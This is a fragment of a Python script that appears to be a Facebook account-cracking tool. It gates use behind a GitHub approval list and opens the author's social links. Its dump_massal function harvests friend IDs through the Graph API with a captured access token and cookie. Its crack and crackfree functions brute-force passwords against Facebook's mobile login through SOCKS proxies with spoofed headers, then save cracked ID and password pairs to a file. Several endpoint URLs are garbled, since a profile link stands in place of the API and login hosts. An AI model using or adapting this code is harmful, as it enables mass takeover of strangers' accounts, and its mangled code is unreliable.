...
pretty.install()
CON=sol()
 #------------------[https://www.facebook.com/profile.php?id=100095522080827-King ]-------------------#
...
time.sleep(2)
os.system(f'xdg-open https://youtube.com/@alamin-360')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100095522080827?ref=share')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/Sakibalamin/.prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Sakibalamin').text
        ua=open('bbnew.txt','w')
...
║   \033[0;91m██  █  ██ \033[0;92m███████ \033[0;91m███████ \033[0;92m██ \033[0;91m██ ████ ██   ║
║   \033[0;91m██ ███ ██ \033[0;92m██   ██ \033[0;91m     ██ \033[0;92m██ \033[0;91m██  ██  ██   ║
║   \033device-b██  \033[0;92m██   ██ \033[0;91m███████ \033[0;92m██ \033[0;91m██      ██   ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Sakibalamin/Approve.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
def menu():
    ...
    if ASIF in ['111']:
        ...
        os.system('xdg-open https://github.com/Sakibalamin')
        os.system("python nono.py")
    elif ASIF in ['3','03']:
        result()
    elif ASIF in ['0']:
...
def dump_massal():
    ...
    for userr in uid:
        try:
            col = ses.get('https://www.facebook.com/profile.php?id=100095522080827/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            p = ses.get('https://www.facebook.com/profile.php?id=100095522080827/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            ...
            po = ses.post('https://www.facebook.com/profile.php?id=100095522080827/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://www.facebook.com/profile.php?id=100095522080827/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•alamin-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " alamin,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
